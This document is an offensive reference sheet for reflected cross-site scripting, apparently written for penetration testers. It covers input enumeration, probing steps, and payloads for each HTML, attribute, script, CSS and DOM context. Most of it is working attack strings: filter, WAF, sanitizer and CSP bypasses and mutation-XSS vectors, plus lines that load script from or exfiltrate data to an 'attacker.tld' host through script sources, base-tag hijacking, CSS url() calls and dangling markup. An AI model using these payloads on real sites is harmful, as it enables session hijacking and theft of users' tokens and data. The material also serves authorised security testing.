# Reflection XSS

## Input points to enumerate
- Query params incl. duplicates `a=1&a=2`, arrays `a[]=1`, matrix/path params `/x;<payload>` — frameworks pick first vs last differently. HPP: `?a=<svg>&a=onload=alert(1)>`, try param name + value, semicolon delimiters.
- Path segments / route params `/user/<name>`, 404 pages, error/stack-trace pages, search, pagination/sort.
- All form fields — hidden, disabled, unchecked, and fields the UI never submits.
- Headers echoed back: `Referer`, `User-Agent`, `Cookie`, `Origin`, `Accept*`, `Host`, `X-Host`, `Forwarded`, `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`, `X-Forwarded-Prefix`, `X-Forwarded-Scheme`, `X-Forwarded-Port`, `X-Forwarded-Server`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`, `X-Requested-With`, `Via`, `X-Api-Version`, `X-Client-IP`, `X-ProxyUser-IP`.
- Cookies (incl. `Set-Cookie` values rendered later), JSON body fields landing in HTML, uploaded/downloaded filenames, `Content-Disposition`.
- Redirect targets: `Location`, `<meta refresh>`, JS-built `location`, `returnUrl`/`next`/`redirect_uri`/`continue`.
- Email/notification templates, "share this" previews, contact-form confirmations, ticket/support descriptions, admin log viewers, analytics panels.
- Head reflections (`<meta>`, `<title>`, `<link rel=stylesheet>`, `<base>`, canonical/`og:url`) — same page, often a different encoding path than the body.
- Client-only sources: `location.hash`/`search`/`pathname`/`href`, `document.URL`, `document.referrer`, `document.baseURI`, `window.name` (survives cross-origin navigation), `postMessage` data, `localStorage`/`sessionStorage`, `history.state`, `document.cookie`.

## Probe workflow
1. One unique canary per input point (`xsstest12345` + per-param suffix) to attribute each reflection.
2. Compare raw response (curl / view-source) vs rendered DOM. DOM-only = client-side sink; trace source to sink.
3. Char probe `' " < > / \ & { } ( ) ` ; : =` — record per char: raw / entity-encoded / stripped / backslash-escaped / uppercased / truncated / double-encoded.
4. Length 20 / 200 / 2000 chars: find cutoff and whether truncation lands before or after injection point. Put payload first if trailing truncation.
5. Decode depth: `%3c`, `%253c`, `&#x3c;`, `%26%23x3c%3b`, `&lt;`, mixed case; count passes before reflection.
6. Read surrounding bytes, pin exact context, build minimal payload for that context only.
7. Fire in real browser with console open; confirm execution, not string presence. Console errors hint at parsing failure.
8. Check `Content-Type` + charset, `X-Content-Type-Options: nosniff`, CSP tokens, `Vary`.
9. Same input can reflect multiple times in different contexts — break out of the first to reach the second. If all reflections land inside quoted attributes and `<`/`>` are encoded so no tag breakout, treat each URL attribute (`href`/`src`/`action`) as a potential `javascript:` click-XSS candidate and check for backend string filters on protocol/scheme.
10. Feed the same payload twice (two params, param + header, param + cookie, repeated `a=1&a=2`, param name + value) — second reflection can close a tag the first opened.
11. Same reflection may also be SSTI (`{{7*7}}`, `${7*7}`) or SQLi — note it, don't lose finding.

## Context → minimal payload

### HTML text / free tag position
- `<script>alert(1)</script>`; if dead: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`.
- Unclosed tag at EOF can fire: `<img src=x onerror=alert(1)` (no `>` needed if input is truncated/filtered but document ends).
- No interaction: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`, `<input autofocus onfocus=alert(1)>`, `<select autofocus onfocus=alert(1)>`, `<textarea autofocus onfocus=alert(1)>`, `<xss autofocus tabindex=1 onfocus=alert(1)>`, `<video><source onerror=alert(1)>`, `<audio src=x onerror=alert(1)>`, `<marquee onstart=alert(1)>`, `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, `<body onload=alert(1)>` (if body tag unclosed/open).
- Click required, survives most filters: `<x onclick=alert(1)>x</x>`, `<a href=javascript:alert(1)>a</a>`, `<svg><a xlink:href=javascript:alert(1)>x</a>`.

### Attribute contexts
- Double-quoted: `"><img src=x onerror=alert(1)>`; if `>` filtered: `" onmouseover=alert(1) x="` / `" autofocus onfocus=alert(1) x="`.
- Single-quoted: `'><svg onload=alert(1)>`, `' onmouseover=alert(1) x='`, `' autofocus onfocus=alert(1) x='` (when `<`/`>` are entity-encoded so tag breakout impossible but single quote is not escaped, inject an event attribute inside the value — no `>` needed; `autofocus onfocus` fires immediately on focusable elements like `<input>`/`<select>`/`<textarea>`).
- **Unquoted attribute: quotes are literal, never break out.** Use whitespace or `>` to end value: ` onmouseover=alert(1) `, ` autofocus onfocus=alert(1)`, `><script>alert(1)</script>`. Entities decode into value, don't affect tokenizer.
- Attribute name position (inside open tag): ` x onload=alert(1) ` — needs leading space; if glued to tag name, close tag first. Attribute names are lowercased, so case filters only.
- Slash as separator when spaces filtered: `<svg/onload=alert(1)>`, `<script/src=//attacker.tld/x>`.
- Existing `on*` string value: `';alert(1)//`, `'-alert(1)-'`; if both quotes escaped, use `</script>` breakout or close tag.
- Existing `<script src="…">`: set `src="//attacker.tld/x"` and serve JS.
- `href`/`src`/`action`/`formaction`/`data`/`poster`/`xlink:href`: `javascript:alert(1)`, `javascript:alert(1)//`, `javascript&colon;alert(1)`; `<form action=javascript:alert(1)><input type=submit>`, `<button formaction=javascript:alert(1)>x`, `<base href=//attacker.tld/>` to hijack relative `<script src>`/`<a href>`. `iframe src=javascript:`/`object data=javascript:` are inconsistent across browsers — only report after confirmed execution.
  - When the reflected value lands inside a double-quoted URL attribute and quotes/`<`/`>` are all escaped so tag breakout is impossible, treat the URL attribute itself as the sink: `javascript:alert(1)` requires a click but is still XSS. Backend `strtolower` + keyword substitution (e.g. `script`→`scr_ipt`, `on`→`o_n`, `href`→`h_ref`, `data`→`d_ata`) defeats case mixing; bypass with HTML entities for key letters: `java&#115;cript:alert(1)` (decimal `&#115;` = s), `jav&#x61;script:alert(1)` (hex `&#x61;` = a), `&#106;avascript:alert(1)` (decimal `&#106;` = j). The browser decodes entities in attribute values before scheme parsing. If the app also requires the value to contain `http://` to accept/sanitize the link, append `//http://` as a JS comment: `java&#115;cript:alert(1)//http://`.
- `data:text/html;base64,…` / `data:text/html,<script>…`: top-level navigation to `data:` blocked; useful in `iframe`/`object`/`embed` or script assignment.
- `srcdoc`: `<iframe srcdoc="<script>parent.alert(1)</script>">` — literal `<` in quoted attr is legal; `&lt;script&gt;…` also works. Requires no sandbox without `allow-scripts`, inherits parent CSP.
- `style="…"`: `javascript:` in `url()` dead in modern browsers; use CSS exfil or break out.

### Script context
- JavaScript string single-quoted: `';alert(1)//`, `'-alert(1)-'`; double-quoted: `";alert(1)//`; backslash-escaped: `\';alert(1)//`.
- Non-string: `1;alert(1)//`, bare `alert(1)`; template literal: `${alert(1)}`; regex: `/;alert(1)//`; line comment: prepend `%0a`.
- `</script>` breakout works everywhere in `<script>` — string, comment, regex. Variants: `</script><script>alert(1)</script>`, `</script >`, `</script/x>`, `</script/>`, `</script foo=bar>`, `</ScRiPt>`, `</script\t>`. `</scriptx>` does not close.
  - One-pass `</script` stripping: preceding `<!--` puts tokenizer into script-data-escaped state; following `<script` into double-escaped state where `</script>` no longer closes — add extra `</script>`.
- JSON.stringify output inside `<script>` — JSON doesn't escape `<`, `>`, `/`: `"</script><script>alert(1)</script>"`. `\u2028`/`\u2029` breakouts dead since ES2019.
- `JSONP`: `/api?callback=alert(1)//` → `<script src="/api?callback=alert(1)//">`; also CSP whitelist bypass.

### Comments / raw text / foreign content
- HTML comment: `--><img src=x onerror=alert(1)>`, `--!><script>alert(1)</script>`.
- RCDATA `<textarea>`/`<title>`: `</textarea><img src=x onerror=alert(1)>`, `</title><svg onload=alert(1)>`.
- RAWTEXT `<style>`, `<xmp>`, `<noembed>`, `<noframes>`, `<noscript>` with JS on: close element then tag. `<plaintext>` swallows rest.
- `<template>`: inert container; break `</template><img src=x onerror=alert(1)>`.
- `<noscript>` parses differently JS on/off → mXSS: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`.
- SVG context: `<svg><script>alert(1)</script>`, `<svg><script href=data:,alert(1)>`, `<svg><a xlink:href=javascript:alert(1)>x</a>`, `</svg><img src=x onerror=alert(1)>`. SVG tolerates unquoted/odd attributes and self-closing. `<svg><foreignObject><iframe srcdoc=...>` works.

### CSS / style
- `</style><img src=x onerror=alert(1)>`; if `<` blocked use CSS-only exfil: `}body{background:url(//attacker/?x)}`, `@import'//attacker.tld/x'`, `<link rel=stylesheet href=//attacker.tld/x>`.
- Attribute-value exfil chain without JS: `input[value^="a"]{background:url(//attacker/a)}`.
- `style="…"` `javascript:` dead; use CSS exfil or break out to tag.

### DOM sinks
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/`Range.createContextualFragment`: `<img src=x onerror=alert(1)>`; `document.write` during parse may need `</script>` first.
- `eval`/`setTimeout(string)`/`setInterval(string)`/`Function`: `alert(1)` (blocked by CSP without `'unsafe-eval'`).
- `$(…)`/`$.html()`/`$.append()`: `<img src=x onerror=alert(1)>`, `#<img src=x onerror=alert(1)>` (jQuery <3.5 treats leading `#` selector as HTML).
- `.attr('href', v)` / `location = v` / `location.assign|replace`: `javascript:alert(1)`, `#javascript:alert(1)`.
- `script.src = v` / `iframe.src = v`: `//attacker.tld/x.js`; hash-controlled `#//attacker.tld/x.js`.
- `localStorage`/`sessionStorage`/`history.state`/`document.cookie` read into sink.
- `postMessage` without origin check: from console `win.postMessage('<img src=x onerror=alert(1)>','*')`.
- AngularJS present (`ng-app`): `{{constructor.constructor('alert(1)')()}}` works on ≤1.5 as sandbox escape; 1.6+ removed sandbox — test `{{1+1}}` first. Vue `v-html` / React `dangerouslySetInnerHTML` sinks take raw HTML.
- Head reflections: `<title></title><script>alert(1)</script>`, `</title><img src=x onerror=alert(1)>`, `"><script>…` inside `<meta content="…">`.

## Filter & WAF bypass
- `<script>` blocked → event-driven tags, `<svg/onload=alert(1)>`, `<a href=javascript:alert(1)>`, `srcdoc`.
- `on\w+=` blocked → `<svg><script>alert(1)</script>`, `javascript:` URL attributes, `srcdoc`. When `on*` and `<script` are both string-substituted/filtered but `<` and `>` pass through unchanged, use a `data:` URL to embed a full script without `<script>` in the raw payload: `<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`, `<object data="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`, `<embed src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`. URL-encode `<script>`/`</script>` as `%3Cscript%3E`/`%3C/script%3E` to dodge keyword filters; the browser decodes inside the iframe/object and executes. `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">` also works when the reflected value is an HTML attribute.
- Quotes blocked → unquoted attribute `<img src=x onerror=alert(1)>`, ` onmouseover=alert(1) `.
- Parentheses blocked → entities in handler values are decoded: `<svg onload=alert&#40;1&#41;>`; named entities `&lpar;`/`&rpar;`; tagged template ``onload=alert`1` ``; `<svg onload=alert;throw 1>`.
- `<` and `>` blocked → stay in JS/URL context: `alert(1)`, `javascript:alert(1)`, or `%3c`/`%253c`/`&#x3c;` if decode pass after filtering.
- `>` only blocked → omit it: `<img src=x onerror=alert(1)` (EOF closes tag).
- Spaces blocked → `/`, tab, `%0a`, `%0c`, `/**/`, `&Tab;`, `&NewLine;`.
- `javascript:` blocked → `JaVaScRiPt:`, `java\tscript:`, `jav&#x0a;ascript:`, `jav&#x61;script:`, `&#106;avascript:`, `javascript&colon;alert(1)`, `//attacker.tld`. If the backend lowercases before matching keywords, case mixing is useless; instead HTML-encode key letters: decimal `&#115;` = s, hex `&#x73;` = s, un-semicoloned `&#115` also works — `java&#115;cript:alert(1)`, `jav&#x61;script:alert(1)`, `&#106;avascript:alert(1)`. The browser decodes numeric entities in attribute values before the scheme is interpreted. If the app additionally requires the value to contain `http://` for link validation, append `//http://` as a JS comment after the payload.
- `alert` blocked → `prompt(1)`, `confirm(1)`, `print()`, `(alert)(1)`, `top['al'+'ert'](1)`, `\u0061lert(1)`, `[].constructor.constructor('alert(1)')()`, `globalThis['al\u0065rt'](1)`.
- Keyword blocklist on `script` → `<ScRiPt>`, `<scr<script>ipt>`, `<script x>`, `script\nsrc=`, `<script/src=//x>`.
- Named entities to dodge `%`/`&#x` filters: `&colon;`, `&sol;`, `&Tab;`, `&NewLine;`, `&lpar;`/`&rpar;`.
- Single-pass token removal → `<scr<script>ipt>alert(1)</scr</script>ipt>`; if filter loops to empty, look for double-write reconstitution (`<sc<script>ript>`).
- mXSS: `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">`, `<svg></p><style><g title="</style><img src=x onerror=alert(1)>">`, `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`, `<template>` moved between contexts.
- Length limit → `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`; bolt handler onto existing tag.
- Truncation → payload first; never rely on trailing `</script>` or closing quote.
- HPP, double-encoded body (`%253c`), multipart part name, `X-HTTP-Method-Override`, method switch, body field names vs values.
- Legacy multi-byte charsets (GBK/Shift_JIS/EUC-JP) with trailing-byte escape: `%bf%5c` eats backslash. Only old apps; UTF-7 and overlong UTF-8 dead.

## Sanitizer fingerprints → what to try
- `htmlspecialchars` default `ENT_COMPAT` (only `"` escaped) → single-quoted attr breaks: `' onmouseover=alert(1) x='`, `' autofocus onfocus=alert(1) x='`. `ENT_QUOTES` both quotes escaped → unquoted attr or numeric entity bypass.
- `addslashes` as HTML escaping → backslash literal, quote still closes: `"><img src=x onerror=alert(1)>`.
- `strip_tags` → keeps attributes of allowed tags; inject into allowed tag's attribute or stray `<`.
- Case-sensitive `str_replace` → `<ScRiPt>`, `OnErRoR=`.
- Decode order: filter after decoding → `&#x3c;` blocked; filter before browser decode → `&#x3c;script&#x3e;` lands live.
- **Entities never decode inside `<script>`** — `&quot;`/`&lt;` stay literal. They decode in text nodes and attribute values → `&#x3c;` is real `<`, `&colon;` is `:`.
- Server output + reachable DOM sink = double-decode XSS: single-encoded reflection + `innerHTML`/`eval`/`$.html()`.
- Sanitizer output re-parsed by client is mXSS fingerprint — look for cached sanitized HTML that gets re-serialized.
- DOMPurify/Trusted Types: check version, `ADD_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`/`ALLOWED_URI_REGEXP`, and whether `require-trusted-types-for 'script'` enforced. TT kills most HTML sinks unless policy exposes `createHTML` passthrough.
- Framework raw output: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{{{ }}}`, `<%= raw %>`, `|safe`, `|raw`, `Markup()`, `mark_safe`, `ng-bind-html`.
- DOM clobbering where sink reads by `id`/`name`: `<a id=x><a id=x name=y href=//attacker.tld>`.

## Execution constraints: quick check before burning time
- Read real response: `Content-Type`, `X-Content-Type-Options: nosniff`, CSP `script-src` nonce/hash `strict-dynamic`, Trusted Types.
- No `script-src`, or `'unsafe-inline'` → all inline vectors work.
- Without `'unsafe-inline'` every `on*=` and `javascript:` is blocked; payload set collapses to `<script src>` allowed host or nonce-bearing script.
- `script-src 'self'` → JSONP endpoint, same-origin upload, same-origin library, or `<base href=//attacker.tld/>` + relative `<script src>` if `base-uri` unset.
- Nonce present → nonce reuse across responses, nonce injectable via reflection, or pivot to DOM sinks.
- `strict-dynamic` + whitelist → find whitelisted host with JSONP/upload gadget.
- `base-uri` unset → base hijack. `form-action` unset → `javascript:` in form action. `object-src` unset → `<object>`/`<embed>`.
- `require-trusted-types-for 'script'` → HTML sinks die unless policy passthrough.
- Report-Only CSP → payloads still run.

## Cases that change payload
- **Header reflection** executes in whatever later renders that header — effectively stored: canary first, then `//attacker.tld/?x`. Only report if victim request can carry value: `User-Agent`/`Referer`/`Origin` via link/form/redirect; `X-Forwarded-Host`/`Host` via proxy/cache.
- **Header → cache poisoning**: `X-Forwarded-Host`/`Host` reflected into cached HTML turns reflected into stored. Check `Vary`, unkeyed headers, cache key.
- **Header → response splitting**: `%0d%0a` in echoed header, inject `Content-Type: text/html` + body.
- **Dangling markup** (no JS): `<img src='//attacker.tld/?`, `<textarea>`, `<a href='//attacker.tld/?` leak following bytes (CSRF token, PII).
- **JSON body rendered as HTML** or embedded in `<script>`: `{"x":"</script><script>alert(1)</script>"}`.
- **`<script type="application/json">` blob** read into `innerHTML`: put `</script><script>alert(1)</script>` inside JSON string; safe alone.
- **`Content-Type: application/json` + no nosniff** — modern browsers do not sniff to HTML. Only `text/html`, absent/unknown content type, or framed/`document.write`-ed response worth pursuing. `text/plain` no longer sniffed. Don't report bare header combo.
- **Split reflection across two params/headers** — one closes tag, other supplies handler.
- **Different origin reflection** — prove with `alert(document.domain)`.
- **`Location:` reflection** is open redirect, not XSS; `javascript:` there is not honored.
- **Upload/download responses** — filename in `Content-Disposition` or inline `<a href>`; SVG/HTML/PDF served inline = stored XSS.
- **Email/notification templates** — payload runs in mail client/webmail preview; check raw MIME escaping.
- **Reflection into `<script src>` query string** — often JSONP gadget: try `callback`, `cb`, `jsonp`, `_callback`, `jsoncallback`.
- **Reflection into attribute read later by JS** (`data-*`, `value`, `title`) → second-order into client-side sink; trace reader.
- **Multiple attribute sinks with no tag breakout** — if the same input reflects into `<input value="...">`, `<a href="...">`, etc., and all are double-quoted with `<`/`>` entity-encoded, don't keep hunting for `>`; the `href`/`src`/`action` attribute itself is the sink. Inject `javascript:alert(1)` and require a click. Bypass backend `strtolower`+keyword substitution with HTML entities for key letters, and satisfy `http://` validation with `//http://` as a trailing JS comment.
- **`window.name` source** — attacker sets `window.name = '<img src=x onerror=alert(1)>'` then navigates; check if victim reads into sink.

## Verification and false positives
- Prove origin with `alert(document.domain)`; `alert(1)` fine for PoC. Never exfiltrate real user cookies.
- Three states: **reflected raw** / **reflected and encoded** (not exploitable as-is) / **reflected and executable**. Most false positives are first two.
- Entity-encoded quotes inside attribute (`value="&quot;…"`) are decoded for display but never close attribute; same for `&lt;`/`&gt;` in attr. Not breakout. However, numeric entities in a URL attribute value do decode to the scheme: `java&#115;cript:` is treated as `javascript:` after parsing.
- Payload only inside JS string, `<title>`/`<textarea>`, HTML comment, or after truncation does not execute.
- Reflection without `Content-Type: text/html` (covered by nosniff, or `json`/`text/plain`) is not XSS modern browsers.
- Re-test exact curl request vs browser-rendered page — proxies/WAFs rewrite one. Re-test with cache bypass (`?x=1`) and fresh extension-free profile.
- Self-only reflection: confirm attacker-controllable via link/form/header; look for GET variant of POST-only reflection.
- Final PoC must run in target real context (origin, auth); capture exact reproducing request. Use devtools console; console errors may indicate parsing failure.